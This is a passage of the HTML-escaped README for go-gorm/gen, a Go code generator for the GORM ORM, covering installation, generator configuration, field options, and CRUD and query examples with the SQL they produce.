clause&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#set-clause&#34;&gt;&lt;code&gt;Set&lt;/code&gt; clause&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#for-clause&#34;&gt;&lt;code&gt;For&lt;/code&gt; clause&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#method-interface-example&#34;&gt;Method interface example&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#unit-test&#34;&gt;Unit Test&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#smart-select-fields&#34;&gt;Smart select fields&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#advanced-topics&#34;&gt;Advanced Topics&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#hints&#34;&gt;Hints&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#binary&#34;&gt;Binary&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#maintainers&#34;&gt;Maintainers&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;To install Gen package, you need to install Go and set your Go workspace first.&lt;/p&gt; &#xA;&lt;p&gt;1.The first need Go installed(version 1.14+ is required), then you can use the below Go command to install Gen.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go get -u gorm.io/gen&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.Import it in your code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &#34;gorm.io/gen&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Quick start&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Emphasis&lt;/strong&gt;: All use cases in this doc are generated under &lt;code&gt;WithContext&lt;/code&gt; mode. And if you generate code under &lt;code&gt;WithoutContext&lt;/code&gt; mode, please remove &lt;code&gt;WithContext(ctx)&lt;/code&gt; before you call any query method, it helps you make code more concise.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# assume the following code in generate.go file&#xA;$ cat generate.go&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main&#xA;&#xA;import &#34;gorm.io/gen&#34;&#xA;&#xA;// generate code&#xA;func main() {&#xA;    // specify the output directory (default: &#34;./query&#34;)&#xA;    // ### if you want to query without context constrain, set mode gen.WithoutContext ###&#xA;    g := gen.NewGenerator(gen.Config{&#xA;        OutPath: &#34;../dal/query&#34;,&#xA;        /* Mode: gen.WithoutContext|gen.WithDefaultQuery*/&#xA;        //if you want the nullable field generation property to be pointer type, set FieldNullable true&#xA;        /* FieldNullable: true,*/&#xA;        //if you want to assign field which has default value in `Create` API, set FieldCoverable true, reference: https://gorm.io/docs/create.html#Default-Values&#xA;        /* FieldCoverable: true,*/&#xA;        // if you want generate field with unsigned integer type, set FieldSignable true&#xA;        /* FieldSignable: true,*/&#xA;        //if you want to generate index tags from database, set FieldWithIndexTag true&#xA;        /* FieldWithIndexTag: true,*/&#xA;        //if you want to generate type tags from database, set FieldWithTypeTag true&#xA;        /* FieldWithTypeTag: true,*/&#xA;        //if you need unit tests for query code, set WithUnitTest true&#xA;        /* WithUnitTest: true, */&#xA;    })&#xA;  &#xA;    // reuse the database connection in Project or create a connection here&#xA;    // if you want to use GenerateModel/GenerateModelAs, UseDB is necessary or it will panic&#xA;    // db, _ := gorm.Open(mysql.Open(&#34;root:@(127.0.0.1:3306)/demo?charset=utf8mb4&amp;amp;parseTime=True&amp;amp;loc=Local&#34;))&#xA;    g.UseDB(db)&#xA;  &#xA;    // apply basic crud api on structs or table models which is specified by table name with function&#xA;    // GenerateModel/GenerateModelAs. And generator will generate table models&#39; code when calling Excute.&#xA;    g.ApplyBasic(model.User{}, g.GenerateModel(&#34;company&#34;), g.GenerateModelAs(&#34;people&#34;, &#34;Person&#34;, gen.FieldIgnore(&#34;address&#34;)))&#xA;    &#xA;    // apply diy interfaces on structs or table models&#xA;    g.ApplyInterface(func(method model.Method) {}, model.User{}, g.GenerateModel(&#34;company&#34;))&#xA;&#xA;    // execute the action of code generation&#xA;    g.Execute()&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Generate Mode:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;gen.WithoutContext&lt;/code&gt; generate code without &lt;code&gt;WithContext&lt;/code&gt; constraint&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;gen.WithDefaultQuery&lt;/code&gt; generate code with a default global variable &lt;code&gt;Q&lt;/code&gt; as a singleton&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Project Directory&lt;/h3&gt; &#xA;&lt;p&gt;Here is a template for best practices:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;demo&#xA;├── cmd&#xA;│   └── generate&#xA;│       └── generate.go # execute it will generate codes&#xA;├── dal&#xA;│   ├── dal.go # create connections with database server here&#xA;│   ├── model&#xA;│   │   ├── method.go # DIY method interfaces&#xA;│   │   └── model.go  # store struct which corresponding to the database table&#xA;│   └── query  # generated code&#39;s directory&#xA;|       ├── user.gen.go # generated code for user&#xA;│       └── gen.go # generated code&#xA;|       └── user.gen_test.go # generated unit test&#xA;├── biz&#xA;│   └── query.go # call function in dal/gorm_generated.go and query databases&#xA;├── config&#xA;│   └── config.go # DSN for database server&#xA;├── generate.sh # a shell to execute cmd/generate&#xA;├── go.mod&#xA;├── go.sum&#xA;└── main.go&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;API Examples&lt;/h2&gt; &#xA;&lt;h3&gt;Generate&lt;/h3&gt; &#xA;&lt;h4&gt;Generate Model&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// generate a model struct map to table `people` in database&#xA;g.GenerateModel(&#34;people&#34;)&#xA;&#xA;// generate a struct and specify struct&#39;s name&#xA;g.GenerateModelAs(&#34;people&#34;, &#34;People&#34;)&#xA;&#xA;// add option to ignore field&#xA;g.GenerateModel(&#34;people&#34;, gen.FieldIgnore(&#34;address&#34;), gen.FieldType(&#34;id&#34;, &#34;int64&#34;))&#xA;&#xA;// generate all tables, ex: g.ApplyBasic(g.GenerateAllTable()...)&#xA;g.GenerateAllTable()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Field Generate &lt;strong&gt;Options&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;FieldNew           // create new field&#xA;FieldIgnore        // ignore field&#xA;FieldIgnoreReg     // ignore field (match with regexp)&#xA;FieldRename        // rename field in struct&#xA;FieldType          // specify field type&#xA;FieldTypeReg       // specify field type (match with regexp)&#xA;FieldTag           // specify gorm and json tag&#xA;FieldJSONTag       // specify json tag&#xA;FieldJSONTagWithNS // specify new tag with name strategy&#xA;FieldGORMTag       // specify gorm tag&#xA;FieldNewTag        // append new tag&#xA;FieldNewTagWithNS  // specify new tag with name strategy&#xA;FieldTrimPrefix    // trim column prefix&#xA;FieldTrimSuffix    // trim column suffix&#xA;FieldAddPrefix     // add prefix to struct field&#39;s name&#xA;FieldAddSuffix     // add suffix to struct field&#39;s name&#xA;FieldRelate        // specify relationship with other tables&#xA;FieldRelateModel   // specify relationship with exist models&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Data Mapping&lt;/h4&gt; &#xA;&lt;p&gt;Specify data mapping relationship to be whatever you want.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;dataMap := map[string]func(detailType string) (dataType string){&#xA;  &#34;int&#34;: func(detailType string) (dataType string) { return &#34;int64&#34; },&#xA;  // bool mapping&#xA;  &#34;tinyint&#34;: func(detailType string) (dataType string) {&#xA;    if strings.HasPrefix(detailType, &#34;tinyint(1)&#34;) {&#xA;      return &#34;bool&#34;&#xA;    }&#xA;    return &#34;int8&#34;&#xA;  },&#xA;}&#xA;&#xA;g.WithDataTypeMap(dataMap)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Field Expression&lt;/h3&gt; &#xA;&lt;h4&gt;Create Field&lt;/h4&gt; &#xA;&lt;p&gt;Actually, you&#39;re not supposed to create a new field variable, cause it will be accomplished in generated code.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Field Type&lt;/th&gt; &#xA;   &lt;th&gt;Detail Type&lt;/th&gt; &#xA;   &lt;th&gt;Create Function&lt;/th&gt; &#xA;   &lt;th&gt;Supported Query Method&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;generic&lt;/td&gt; &#xA;   &lt;td&gt;field&lt;/td&gt; &#xA;   &lt;td&gt;NewField&lt;/td&gt; &#xA;   &lt;td&gt;IsNull/IsNotNull/Count/Eq/Neq/Gt/Gte/Lt/Lte/Like&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;int&lt;/td&gt; &#xA;   &lt;td&gt;int/int8/.../int64&lt;/td&gt; &#xA;   &lt;td&gt;NewInt/NewInt8/.../NewInt64&lt;/td&gt; &#xA;   &lt;td&gt;Eq/Neq/Gt/Gte/Lt/Lte/In/NotIn/Between/NotBetween/Like/NotLike/Add/Sub/Mul/Div/Mod/FloorDiv/RightShift/LeftShift/BitXor/BitAnd/BitOr/BitFlip&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;uint&lt;/td&gt; &#xA;   &lt;td&gt;uint/uint8/.../uint64&lt;/td&gt; &#xA;   &lt;td&gt;NewUint/NewUint8/.../NewUint64&lt;/td&gt; &#xA;   &lt;td&gt;same with int&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;float&lt;/td&gt; &#xA;   &lt;td&gt;float32/float64&lt;/td&gt; &#xA;   &lt;td&gt;NewFloat32/NewFloat64&lt;/td&gt; &#xA;   &lt;td&gt;Eq/Neq/Gt/Gte/Lt/Lte/In/NotIn/Between/NotBetween/Like/NotLike/Add/Sub/Mul/Div/FloorDiv&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;string&lt;/td&gt; &#xA;   &lt;td&gt;string/[]byte&lt;/td&gt; &#xA;   &lt;td&gt;NewString/NewBytes&lt;/td&gt; &#xA;   &lt;td&gt;Eq/Neq/Gt/Gte/Lt/Lte/Between/NotBetween/In(val/NotIn(val/Like/NotLike/Regexp/NotRegxp/FindInSet/FindInSetWith&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;bool&lt;/td&gt; &#xA;   &lt;td&gt;bool&lt;/td&gt; &#xA;   &lt;td&gt;NewBool&lt;/td&gt; &#xA;   &lt;td&gt;Not/Is/And/Or/Xor/BitXor/BitAnd/BitOr&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;time&lt;/td&gt; &#xA;   &lt;td&gt;time.Time&lt;/td&gt; &#xA;   &lt;td&gt;NewTime&lt;/td&gt; &#xA;   &lt;td&gt;Eq/Neq/Gt/Gte/Lt/Lte/Between/NotBetween/In/NotIn/Add/Sub&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Create field examples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &#34;gorm.io/gen/field&#34;&#xA;&#xA;// create a new generic field map to `generic_a`&#xA;a := field.NewField(&#34;table_name&#34;, &#34;generic_a&#34;)&#xA;&#xA;// create a field map to `id`&#xA;i := field.NewInt(&#34;user&#34;, &#34;id&#34;)&#xA;&#xA;// create a field map to `address`&#xA;s := field.NewString(&#34;user&#34;, &#34;address&#34;)&#xA;&#xA;// create a field map to `create_time`&#xA;t := field.NewTime(&#34;user&#34;, &#34;create_time&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;CRUD API&lt;/h3&gt; &#xA;&lt;p&gt;Here is a basic struct &lt;code&gt;user&lt;/code&gt; and struct &lt;code&gt;DB&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// generated code&#xA;// generated code&#xA;// generated code&#xA;package query&#xA;&#xA;import &#34;gorm.io/gen&#34;&#xA;&#xA;// struct map to table `users` &#xA;type user struct {&#xA;    gen.DO&#xA;    ID       field.Uint&#xA;    Name     field.String&#xA;    Age      field.Int&#xA;    Address  field.Field&#xA;    Birthday field.Time&#xA;}&#xA;&#xA;// struct collection&#xA;type DB struct {&#xA;    db       *gorm.DB&#xA;    User     *user&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Create&lt;/h4&gt; &#xA;&lt;h5&gt;Create record&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// u refer to query.user&#xA;user := model.User{Name: &#34;Modi&#34;, Age: 18, Birthday: time.Now()}&#xA;&#xA;u := query.Use(db).User&#xA;err := u.WithContext(ctx).Create(&amp;amp;user) // pass pointer of data to Create&#xA;&#xA;err // returns error&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Create record with selected fields&lt;/h5&gt; &#xA;&lt;p&gt;Create a record and assign a value to the fields specified.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;u.WithContext(ctx).Select(u.Name, u.Age).Create(&amp;amp;user)&#xA;// INSERT INTO `users` (`name`,`age`) VALUES (&#34;modi&#34;, 18)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Create a record and ignore the values for fields passed to omit&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;u.WithContext(ctx).Omit(u.Name, u.Age).Create(&amp;amp;user)&#xA;// INSERT INTO `users` (`Address`, `Birthday`) VALUES (&#34;2021-08-17 20:54:12.000&#34;, 18)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Batch Insert&lt;/h5&gt; &#xA;&lt;p&gt;To efficiently insert large number of records, pass a slice to the &lt;code&gt;Create&lt;/code&gt; method. GORM will generate a single SQL statement to insert all the data and backfill primary key values.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var users = []*model.User{{Name: &#34;modi&#34;}, {Name: &#34;zhangqiang&#34;}, {Name: &#34;songyuan&#34;}}&#xA;query.Use(db).User.WithContext(ctx).Create(users...)&#xA;&#xA;for _, user := range users {&#xA;    user.ID // 1,2,3&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can specify batch size when creating with &lt;code&gt;CreateInBatches&lt;/code&gt;, e.g:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var users = []*User{{Name: &#34;modi_1&#34;}, ...., {Name: &#34;modi_10000&#34;}}&#xA;&#xA;// batch size 100&#xA;query.Use(db).User.WithContext(ctx).CreateInBatches(users, 100)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It will works if you set &lt;code&gt;CreateBatchSize&lt;/code&gt; in &lt;code&gt;gorm.Config&lt;/code&gt; / &lt;code&gt;gorm.Session&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;db, err := gorm.Open(sqlite.Open(&#34;gorm.db&#34;), &amp;amp;gorm.Config{&#xA;    CreateBatchSize: 1000,&#xA;})&#xA;// OR&#xA;db = db.Session(&amp;amp;gorm.Session{CreateBatchSize: 1000})&#xA;&#xA;u := query.NewUser(db)&#xA;&#xA;var users = []User{{Name: &#34;modi_1&#34;}, ...., {Name: &#34;modi_5000&#34;}}&#xA;&#xA;u.WithContext(ctx).Create(&amp;amp;users)&#xA;// INSERT INTO users xxx (5 batches)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Query&lt;/h4&gt; &#xA;&lt;h5&gt;Retrieving a single object&lt;/h5&gt; &#xA;&lt;p&gt;Generated code provides &lt;code&gt;First&lt;/code&gt;, &lt;code&gt;Take&lt;/code&gt;, &lt;code&gt;Last&lt;/code&gt; methods to retrieve a single object from the database, it adds &lt;code&gt;LIMIT 1&lt;/code&gt; condition when querying the database, and it will return the error &lt;code&gt;ErrRecordNotFound&lt;/code&gt; if no record is found.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Get the first record ordered by primary key&#xA;user, err := u.WithContext(ctx).First()&#xA;// SELECT * FROM users ORDER BY id LIMIT 1;&#xA;&#xA;// Get one record, no specified order&#xA;user, err := u.WithContext(ctx).Take()&#xA;// SELECT * FROM users LIMIT 1;&#xA;&#xA;// Get last record, ordered by primary key desc&#xA;user, err := u.WithContext(ctx).Last()&#xA;// SELECT * FROM users ORDER BY id DESC LIMIT 1;&#xA;&#xA;// check error ErrRecordNotFound&#xA;errors.Is(err, gorm.ErrRecordNotFound)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Retrieving objects with primary key&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;user, err := u.WithContext(ctx).Where(u.ID.Eq(10)).First()&#xA;// SELECT * FROM users WHERE id = 10;&#xA;&#xA;users, err := u.WithContext(ctx).Where(u.ID.In(1,2,3)).Find()&#xA;// SELECT * FROM users WHERE id IN (1,2,3);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the primary key is a string (for example, like a uuid), the query will be written as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;user, err := u.WithContext(ctx).Where(u.ID.Eq(&#34;1b74413f-f3b8-409f-ac47-e8c062e3472a&#34;)).First()&#xA;// SELECT * FROM users WHERE id = &#34;1b74413f-f3b8-409f-ac47-e8c062e3472a&#34;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Retrieving all objects&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Get all records&#xA;users, err := u.WithContext(ctx).Find()&#xA;// SELECT * FROM users;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Conditions&lt;/h5&gt; &#xA;&lt;h6&gt;String Conditions&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Get first matched record&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).First()&#xA;// SELECT * FROM users WHERE name = &#39;modi&#39; ORDER BY id LIMIT 1;&#xA;&#xA;// Get all matched records&#xA;users, err := u.WithContext(ctx).Where(u.Name.Neq(&#34;modi&#34;)).Find()&#xA;// SELECT * FROM users WHERE name &amp;lt;&amp;gt; &#39;modi&#39;;&#xA;&#xA;// IN&#xA;users, err := u.WithContext(ctx).Where(u.Name.In(&#34;modi&#34;, &#34;zhangqiang&#34;)).Find()&#xA;// SELECT * FROM users WHERE name IN (&#39;modi&#39;,&#39;zhangqiang&#39;);&#xA;&#xA;// LIKE&#xA;users, err := u.WithContext(ctx).Where(u.Name.Like(&#34;%modi%&#34;)).Find()&#xA;// SELECT * FROM users WHERE name LIKE &#39;%modi%&#39;;&#xA;&#xA;// AND&#xA;users, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;), u.Age.Gte(17)).Find()&#xA;// SELECT * FROM users WHERE name = &#39;modi&#39; AND age &amp;gt;= 17;&#xA;&#xA;// Time&#xA;users, err := u.WithContext(ctx).Where(u.Birthday.Gt(birthTime).Find()&#xA;// SELECT * FROM users WHERE birthday &amp;gt; &#39;2000-01-01 00:00:00&#39;;&#xA;&#xA;// BETWEEN&#xA;users, err := u.WithContext(ctx).Where(u.Birthday.Between(lastWeek, today)).Find()&#xA;// SELECT * FROM users WHERE birthday BETWEEN &#39;2000-01-01 00:00:00&#39; AND &#39;2000-01-08 00:00:00&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Inline Condition&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// Get by primary key if it were a non-integer type&#xA;user, err := u.WithContext(ctx).Where(u.ID.Eq(&#34;string_primary_key&#34;)).First()&#xA;// SELECT * FROM users WHERE id = &#39;string_primary_key&#39;;&#xA;&#xA;// Plain SQL&#xA;users, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Find()&#xA;// SELECT * FROM users WHERE name = &#34;modi&#34;;&#xA;&#xA;users, err := u.WithContext(ctx).Where(u.Name.Neq(&#34;modi&#34;), u.Age.Gt(17)).Find()&#xA;// SELECT * FROM users WHERE name &amp;lt;&amp;gt; &#34;modi&#34; AND age &amp;gt; 17;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Not Conditions&lt;/h6&gt; &#xA;&lt;p&gt;Build NOT conditions, works similar to &lt;code&gt;Where&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;user, err := u.WithContext(ctx).Not(u.Name.Eq(&#34;modi&#34;)).First()&#xA;// SELECT * FROM users WHERE NOT name = &#34;modi&#34; ORDER BY id LIMIT 1;&#xA;&#xA;// Not In&#xA;users, err := u.WithContext(ctx).Not(u.Name.In(&#34;modi&#34;, &#34;zhangqiang&#34;)).Find()&#xA;// SELECT * FROM users WHERE name NOT IN (&#34;modi&#34;, &#34;zhangqiang&#34;);&#xA;&#xA;// Not In slice of primary keys&#xA;user, err := u.WithContext(ctx).Not(u.ID.In(1,2,3)).First()&#xA;// SELECT * FROM users WHERE id NOT IN (1,2,3) ORDER BY id LIMIT 1;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Or Conditions&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Where(u.Role.Eq(&#34;admin&#34;)).Or(u.Role.Eq(&#34;super_admin&#34;)).Find()&#xA;// SELECT * FROM users WHERE role = &#39;admin&#39; OR role = &#39;super_admin&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Group Conditions&lt;/h6&gt; &#xA;&lt;p&gt;Easier to write complicated SQL query with Group Conditions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;p := query.Use(db).Pizza&#xA;pd := p.WithContext(ctx)&#xA;&#xA;pizzas, err := pd.Where(&#xA;    pd.Where(p.Pizza.Eq(&#34;pepperoni&#34;)).&#xA;        Where(pd.Where(p.Size.Eq(&#34;small&#34;)).Or(p.Size.Eq(&#34;medium&#34;))),&#xA;).Or(&#xA;    pd.Where(p.Pizza.Eq(&#34;hawaiian&#34;)).Where(p.Size.Eq(&#34;xlarge&#34;)),&#xA;).Find()&#xA;&#xA;// SELECT * FROM `pizzas` WHERE (pizza = &#34;pepperoni&#34; AND (size = &#34;small&#34; OR size = &#34;medium&#34;)) OR (pizza = &#34;hawaiian&#34; AND size = &#34;xlarge&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Selecting Specific Fields&lt;/h6&gt; &#xA;&lt;p&gt;&lt;code&gt;Select&lt;/code&gt; allows you to specify the fields that you want to retrieve from database. Otherwise, GORM will select all fields by default.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Select(u.Name, u.Age).Find()&#xA;// SELECT name, age FROM users;&#xA;&#xA;u.WithContext(ctx).Select(u.Age.Avg()).Rows()&#xA;// SELECT Avg(age) FROM users;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Tuple Query&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Where(u.WithContext(ctx).Columns(u.ID, u.Name).In(field.Values([][]interface{}{{1, &#34;modi&#34;}, {2, &#34;zhangqiang&#34;}}))).Find()&#xA;// SELECT * FROM `users` WHERE (`id`, `name`) IN ((1,&#39;humodi&#39;),(2,&#39;tom&#39;));&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;JSON Query&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Where(gen.Cond(datatypes.JSONQuery(&#34;attributes&#34;).HasKey(&#34;role&#34;))...).Find()&#xA;// SELECT * FROM `users` WHERE JSON_EXTRACT(`attributes`,&#39;$.role&#39;) IS NOT NULL;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Order&lt;/h6&gt; &#xA;&lt;p&gt;Specify order when retrieving records from the database&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Order(u.Age.Desc(), u.Name).Find()&#xA;// SELECT * FROM users ORDER BY age DESC, name;&#xA;&#xA;// Multiple orders&#xA;users, err := u.WithContext(ctx).Order(u.Age.Desc()).Order(u.Name).Find()&#xA;// SELECT * FROM users ORDER BY age DESC, name;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get field by string&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;orderCol, ok := u.GetFieldByName(orderColStr) // maybe orderColStr == &#34;id&#34;&#xA;if !ok {&#xA;  // User doesn&#39;t contains orderColStr&#xA;}&#xA;&#xA;users, err := u.WithContext(ctx).Order(orderCol).Find()&#xA;// SELECT * FROM users ORDER BY age;&#xA;&#xA;// OR Desc&#xA;users, err := u.WithContext(ctx).Order(orderCol.Desc()).Find()&#xA;// SELECT * FROM users ORDER BY age DESC;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Limit &amp;amp; Offset&lt;/h6&gt; &#xA;&lt;p&gt;&lt;code&gt;Limit&lt;/code&gt; specify the max number of records to retrieve &lt;code&gt;Offset&lt;/code&gt; specify the number of records to skip before starting to return the records&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;urers, err := u.WithContext(ctx).Limit(3).Find()&#xA;// SELECT * FROM users LIMIT 3;&#xA;&#xA;// Cancel limit condition with -1&#xA;users, err := u.WithContext(ctx).Limit(10).Limit(-1).Find()&#xA;// SELECT * FROM users;&#xA;&#xA;users, err := u.WithContext(ctx).Offset(3).Find()&#xA;// SELECT * FROM users OFFSET 3;&#xA;&#xA;users, err := u.WithContext(ctx).Limit(10).Offset(5).Find()&#xA;// SELECT * FROM users OFFSET 5 LIMIT 10;&#xA;&#xA;// Cancel offset condition with -1&#xA;users, err := u.WithContext(ctx).Offset(10).Offset(-1).Find()&#xA;// SELECT * FROM users;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Group By &amp;amp; Having&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;var users []struct {&#xA;    